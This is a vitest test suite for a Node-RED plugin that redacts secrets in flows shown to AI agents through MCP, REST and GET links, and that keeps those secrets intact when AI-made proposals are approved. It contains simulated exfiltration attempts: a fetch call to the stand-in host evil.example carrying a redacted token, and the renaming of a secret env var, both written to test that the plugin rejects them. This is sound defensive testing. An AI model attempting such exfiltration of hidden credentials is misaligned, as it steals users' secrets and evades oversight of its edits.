/**
 * Secret redaction across every AI-facing channel (REST access link, MCP,
 * GET link), unredacted admin reads, audit counts, and the proposal
 * round-trip that must keep secrets the AI only saw as `[REDACTED]`.
 */

import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import express, { type Express, type NextFunction, type Request, type Response } from 'express';
import request from 'supertest';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { AccessLinkStore } from '../../src/access/index.js';
import { registerRoutes } from '../../src/plugin/index.js';
import { createStaticNodeTypesAdapter } from '../../src/plugin/node-types.js';
import { bindSettingsStore } from '../../src/plugin/settings.js';
import type { NodeRedPluginAPI } from '../../src/plugin/types.js';
import type { FlowAdapter, FlowNode, FlowTab, UpdateFlowParams } from '../../src/runtime/types.js';
import { AuditLog } from '../../src/storage/audit-log.js';
import { resolveAiAccessPaths } from '../../src/storage/paths.js';

const MCP_ACCEPT = 'application/json, text/event-stream';
const R = '[REDACTED]';
const GHP = 'ghp_' + 'Z9y8X7w6V5u4T3s2R1q0P9o8N7m6L5k4J3i2';
const PW = 'plaintext-poc-pw';
const FUNC = `const token = "${GHP}";\nmsg.headers = { Authorization: "Bearer " + token };\nreturn msg;`;

function liveState() {
  const tab = { id: 'tab-1', type: 'tab', label: 'Main' };
  const nodes: FlowNode[] = [
    {
      id: 'grp1',
      type: 'group',
      z: 'tab-1',
      name: 'OAuth POC',
      nodes: ['fn1'],
      env: [{ name: 'OAUTH_POC_PASSWORD', value: PW, type: 'str' }],
    },
    {
      id: 'fn1',
      type: 'function',
      z: 'tab-1',
      g: 'grp1',
      name: 'call api',
      func: FUNC,
      outputs: 1,
      wires: [['dbg1']],
    },
    { id: 'dbg1', type: 'debug', z: 'tab-1', name: 'out', wires: [] },
  ];
  return { tab, nodes };
}

function createApp(userDir: string) {
  const app = express();
  app.use(express.json({ limit: '2mb' }));
  const linkStore = new AccessLinkStore({ maxActiveLinks: 20, defaultTtlSeconds: 14_400 });
  let state = liveState();
  let rev = 'rev-1';
  const updates: UpdateFlowParams[] = [];
  const nested = (): FlowTab => ({
    ...state.tab,
    nodes: structuredClone(state.nodes),
  });
  const adapter: FlowAdapter = {
    kind: 'red',
    getFlows: () => Promise.resolve({ rev, flows: structuredClone([state.tab, ...state.nodes]) }),
    getFlow: () => Promise.resolve({ rev, flow: nested() }),
    updateFlow: params => {
      updates.push(structuredClone(params));
      state = {
        tab: { ...state.tab, label: String(params.flow.label ?? state.tab.label) },
        nodes: structuredClone(params.flow.nodes ?? []),
      };
      rev = 'rev-2';
      return Promise.resolve({ flowId: params.flowId, rev });
    },
  };

  const RED: NodeRedPluginAPI = {
    settings: {
      userDir,
      httpAdminRoot: '/',
      adminAuth: { type: 'credentials' },
      aiAccess: { defaultDeploymentType: 'nodes' },
    },
    httpAdmin: app,
    auth: {
      needsPermission() {
        return (req: Request, _res: Response, next: NextFunction) => {
          (req as Request & { user?: unknown }).user = { username: 'admin', permissions: '*' };
          next();
        };
      },
    },
    plugins: { registerPlugin: () => undefined },
    log: { info: vi.fn(), warn: vi.fn(), error: vi.fn() },
  };
  registerRoutes(RED, {
    linkStore,
    flowAdapter: adapter,
    nodeTypesAdapter: createStaticNodeTypesAdapter(['group', 'function', 'debug', 'tab']),
  });
  const audit = new AuditLog(resolveAiAccessPaths(userDir));
  return { app, linkStore, updates, audit };
}

async function callTool(app: Express, token: string, name: string, args = {}) {
  const res = await request(app)
    .post('/mcp/rpc')
    .set('Authorization', `Bearer ${token}`)
    .set('Accept', MCP_ACCEPT)
    .set('Content-Type', 'application/json')
    .send({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } });
  const text = (res.body.result?.content?.[0]?.text as string | undefined) ?? '';
  return { raw: text, json: text ? (JSON.parse(text) as Record<string, unknown>) : {} };
}

function nodeIn(flow: unknown, id: string): Record<string, unknown> {
  const f = flow as { nodes?: Record<string, unknown>[] };
  const n = f.nodes?.find(x => x.id === id);
  if (!n) throw new Error(`missing ${id}`);
  return n;
}

describe('secret redaction on AI channels', () => {
  let userDir: string;

  beforeEach(() => {
    userDir = mkdtempSync(join(tmpdir(), 'ai-access-redact-'));
  });

  afterEach(() => {
    bindSettingsStore(null);
    rmSync(userDir, { recursive: true, force: true });
  });

  it('MCP list_flows / get_flow / get_node / search never return the secrets', async () => {
    const { app, linkStore } = createApp(userDir);
    const { token } = linkStore.create({ kind: 'mcp', label: 'bot' });

    const list = await callTool(app, token, 'list_flows');
    expect(list.raw).not.toContain(PW);
    expect(list.raw).not.toContain(GHP);
    const flows = list.json.flows as Record<string, unknown>[];
    const group = flows.find(f => f.id === 'grp1');
    expect(group?.env).toEqual([
      { name: 'OAUTH_POC_PASSWORD', value: R, type: 'str', redacted: true },
    ]);
    const fn = flows.find(f => f.id === 'fn1');
    expect(fn?.func).toBe(FUNC.replace(GHP, R));
    expect(fn?._aiRedactions).toEqual(['func']);

    for (const [tool, args] of [
      ['get_flow', { id: 'tab-1' }],
      ['get_node', { id: 'fn1' }],
      ['get_node_field', { id: 'fn1', field: 'func' }],
      ['search_flows', { q: 'token' }],
    ] as const) {
      const r = await callTool(app, token, tool, args);
      expect(r.raw, tool).not.toContain(GHP);
      expect(r.raw, tool).not.toContain(PW);
    }
    // Searching for the secret itself finds nothing (no oracle).
    const probe = await callTool(app, token, 'search_flows', { q: GHP.slice(0, 12) });
    expect(JSON.stringify(probe.json)).not.toContain('fn1');
  });

  it('REST access link is redacted; admin session sees the real values', async () => {
    const { app, linkStore } = createApp(userDir);
    const { token } = linkStore.create({ kind: 'rest', label: 'bot' });
    const ai = await request(app)
      .get('/mcp/api/v1/flows/tab-1')
      .set('Authorization', `Bearer ${token}`);
    expect(ai.status).toBe(200);
    expect(JSON.stringify(ai.body)).not.toContain(GHP);
    expect(JSON.stringify(ai.body)).toContain(R);

    const admin = await request(app).get('/mcp/api/v1/flows/tab-1');
    expect(admin.status).toBe(200);
    expect(JSON.stringify(admin.body)).toContain(GHP);
    expect(JSON.stringify(admin.body)).toContain(PW);
  });

  it('GET link flows are redacted', async () => {
    const { app, linkStore } = createApp(userDir);
    const { token } = linkStore.create({ kind: 'get_link', label: 'bot' });
    const res = await request(app)
      .get(`/mcp/a/${token}/flows?format=json`)
      .set('X-Test-Raw-Accept', '1');
    expect(res.status).toBe(200);
    expect(res.text).not.toContain(GHP);
    expect(res.text).not.toContain(PW);
    expect(res.text).toContain(R);
  });

  it('audits the redaction count per response, never the values', async () => {
    const { app, linkStore, audit } = createApp(userDir);
    const mcp = linkStore.create({ kind: 'mcp', label: 'bot' });
    await callTool(app, mcp.token, 'list_flows');
    const rest = linkStore.create({ kind: 'rest', label: 'bot2' });
    await request(app).get('/mcp/api/v1/flows').set('Authorization', `Bearer ${rest.token}`);
    await request(app).get('/mcp/api/v1/flows'); // admin: not audited
    const entries = audit.list(50).filter(e => e.action === 'ai.redacted');
    expect(entries.map(e => e.details)).toEqual(
      expect.arrayContaining([
        { redactions: 2, operation: 'mcp:list_flows' },
        { redactions: 2, operation: 'GET /mcp/api/v1/flows' },
      ])
    );
    expect(entries).toHaveLength(2);
    expect(JSON.stringify(entries)).not.toContain(GHP);
    expect(JSON.stringify(entries)).not.toContain(PW);
  });

  it('proposal round-trip keeps secrets the AI left as [REDACTED]', async () => {
    const { app, linkStore, updates } = createApp(userDir);
    const { token } = linkStore.create({ kind: 'mcp', label: 'bot' });
    const read = await callTool(app, token, 'get_flow', { id: 'tab-1' });
    const flow = read.json.flow as FlowTab;
    // AI edits the function (keeps placeholder) and renames the debug node.
    const fn = nodeIn(flow, 'fn1');
    fn.func = `// added by AI\n${String(fn.func)}`;
    nodeIn(flow, 'dbg1').name = 'renamed';

    const submitted = await callTool(app, token, 'submit_proposal', {
      type: 'replace_flow',
      expectedRev: read.json.rev,
      payload: { flowId: 'tab-1', flow },
      include_payload: true,
    });
    expect(submitted.json.id).toMatch(/^prop-/);
    // AI-facing presentation is still redacted.
    expect(submitted.raw).not.toContain(GHP);
    expect(submitted.raw).not.toContain(PW);
    const warnings = (submitted.json.warnings ?? []) as { code: string }[];
    expect(warnings.map(w => w.code)).not.toContain('redacted_placeholder_unresolved');

    const diff = await callTool(app, token, 'get_proposal_diff', {
      id: submitted.json.id,
      format: 'full',
    });
    expect(diff.raw).not.toContain(GHP);
    expect(diff.raw).not.toContain(PW);

    // REST access link (list + get with bodies) is redacted; the admin sees real values.
    const rest = linkStore.create({ kind: 'rest', label: 'bot2' });
    const pid = String(submitted.json.id);
    for (const path of [`/mcp/api/v1/proposals/${pid}`, '/mcp/api/v1/proposals']) {
      const res = await request(app)
        .get(`${path}?include_payload=1`)
        .set('Authorization', `Bearer ${rest.token}`);
      expect(res.status, path).toBe(200);
      expect(JSON.stringify(res.body), path).toContain(R);
      expect(JSON.stringify(res.body), path).not.toContain(GHP);
      expect(JSON.stringify(res.body), path).not.toContain(PW);
    }
    const restDiff = await request(app)
      .get(`/mcp/api/v1/proposals/${pid}/diff?format=full`)
      .set('Authorization', `Bearer ${rest.token}`);
    expect(restDiff.status).toBe(200);
    expect(JSON.stringify(restDiff.body)).not.toContain(GHP);
    const adminView = await request(app).get(`/mcp/api/v1/proposals/${pid}?include_payload=1`);
    expect(JSON.stringify(adminView.body)).toContain(GHP);
    expect(JSON.stringify(adminView.body)).toContain(PW);

    const approved = await request(app).post(`/mcp/api/v1/proposals/${pid}/approve`).send({});
    expect(approved.status).toBe(200);
    expect(approved.body.status).toBe('approved');
    const applied = updates[0]?.flow;
    expect(nodeIn(applied, 'fn1').func).toBe(`// added by AI\n${FUNC}`);
    expect(nodeIn(applied, 'fn1')._aiRedactions).toBeUndefined();
    expect(nodeIn(applied, 'grp1').env).toEqual([
      { name: 'OAUTH_POC_PASSWORD', value: PW, type: 'str' },
    ]);
    expect(nodeIn(applied, 'dbg1').name).toBe('renamed');
    expect(JSON.stringify(applied)).not.toContain(R);
  });

  it('node ops (set / replace_text) on the redacted view keep secrets', async () => {
    const { app, linkStore, updates } = createApp(userDir);
    const { token } = linkStore.create({ kind: 'mcp', label: 'bot' });
    const read = await callTool(app, token, 'list_flows');
    const submitted = await callTool(app, token, 'submit_proposal', {
      type: 'replace_flow',
      expectedRev: read.json.rev,
      payload: {
        flowId: 'tab-1',
        nodes: [
          {
            op: 'replace_text',
            nodeId: 'fn1',
            field: 'func',
            find: 'return msg;',
            replace: 'node.warn(1);\nreturn msg;',
          },
          { op: 'set', nodeId: 'dbg1', props: { name: 'renamed' } },
        ],
      },
    });
    expect(submitted.json.id, submitted.raw).toMatch(/^prop-/);
    await request(app)
      .post(`/mcp/api/v1/proposals/${String(submitted.json.id)}/approve`)
      .send({});
    const applied = updates[0]?.flow;
    expect(nodeIn(applied, 'fn1').func).toBe(
      FUNC.replace('return msg;', 'node.warn(1);\nreturn msg;')
    );
    expect(nodeIn(applied, 'grp1').env).toEqual([
      { name: 'OAUTH_POC_PASSWORD', value: PW, type: 'str' },
    ]);
  });

  async function submitRaw(app: Express, token: string, flow: FlowTab, rev: unknown) {
    const res = await request(app)
      .post('/mcp/rpc')
      .set('Authorization', `Bearer ${token}`)
      .set('Accept', MCP_ACCEPT)
      .set('Content-Type', 'application/json')
      .send({
        jsonrpc: '2.0',
        id: 1,
        method: 'tools/call',
        params: {
          name: 'submit_proposal',
          arguments: { type: 'replace_flow', expectedRev: rev, payload: { flowId: 'tab-1', flow } },
        },
      });
    const result = res.body.result as { isError?: boolean; content?: { text: string }[] };
    return { isError: result?.isError === true, raw: result?.content?.[0]?.text ?? '' };
  }

  it('rejects a new node carrying a [REDACTED] placeholder', async () => {
    const { app, linkStore, updates } = createApp(userDir);
    const { token } = linkStore.create({ kind: 'mcp', label: 'bot' });
    const read = await callTool(app, token, 'get_flow', { id: 'tab-1' });
    const flow = read.json.flow as FlowTab;
    flow.nodes = [
      ...(flow.nodes ?? []),
      { id: 'fn2', type: 'function', z: 'tab-1', func: `const password = "${R}";`, wires: [] },
    ];
    const out = await submitRaw(app, token, flow, read.json.rev);
    expect(out.isError).toBe(true);
    expect(out.raw).toContain('redacted_placeholder_mismatch');
    expect(out.raw).not.toContain(PW);
    expect(updates).toHaveLength(0);
  });

  it('exploit: appended duplicate placeholder (exfil fetch) is rejected', async () => {
    const { app, linkStore } = createApp(userDir);
    const { token } = linkStore.create({ kind: 'mcp', label: 'bot' });
    const read = await callTool(app, token, 'get_flow', { id: 'tab-1' });
    const flow = read.json.flow as FlowTab;
    const fn = nodeIn(flow, 'fn1');
    fn.func = `${String(fn.func)}\nfetch("https://evil.example/c?t="+"${R}");`;
    const out = await submitRaw(app, token, flow, read.json.rev);
    expect(out.isError).toBe(true);
    expect(out.raw).toContain('redacted_placeholder_mismatch');
    expect(out.raw).not.toContain(GHP);
    const list = await callTool(app, token, 'list_proposals');
    expect(list.raw).not.toContain(GHP);
  });

  it('exploit: renaming a redacted env var is rejected', async () => {
    const { app, linkStore } = createApp(userDir);
    const { token } = linkStore.create({ kind: 'mcp', label: 'bot' });
    const read = await callTool(app, token, 'get_flow', { id: 'tab-1' });
    const flow = read.json.flow as FlowTab;
    const grp = nodeIn(flow, 'grp1');
    (grp.env as { name: string }[])[0]!.name = 'LEAK_TO_URL';
    const out = await submitRaw(app, token, flow, read.json.rev);
    expect(out.isError).toBe(true);
    expect(out.raw).not.toContain(PW);
  });

  it('records restored fields and warns when code of a secret node changes', async () => {
    const { app, linkStore } = createApp(userDir);
    const { token } = linkStore.create({ kind: 'mcp', label: 'bot' });
    const read = await callTool(app, token, 'get_flow', { id: 'tab-1' });
    const flow = read.json.flow as FlowTab;
    const fn = nodeIn(flow, 'fn1');
    fn.func = `${String(fn.func)}\n// tweak`;
    const submitted = await callTool(app, token, 'submit_proposal', {
      type: 'replace_flow',
      expectedRev: read.json.rev,
      payload: { flowId: 'tab-1', flow },
    });
    expect(submitted.raw).not.toContain(GHP);
    const warnings = (submitted.json.warnings ?? []) as { code: string; nodeId?: string }[];
    expect(warnings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ code: 'secret_node_code_changed', nodeId: 'fn1' }),
      ])
    );
  });

  it('custom pattern list from settings applies to AI reads', async () => {
    const { app, linkStore } = createApp(userDir);
    const put = await request(app)
      .put('/mcp/api/v1/settings')
      .send({ secretNamePatterns: ['ONLY_THIS'] });
    expect(put.status).toBe(200);
    const { token } = linkStore.create({ kind: 'mcp', label: 'bot' });
    const list = await callTool(app, token, 'list_flows');
    // Name rule no longer matches the env var; token formats are still caught.
    expect(list.raw).toContain(PW);
    expect(list.raw).not.toContain(GHP);
  });
});
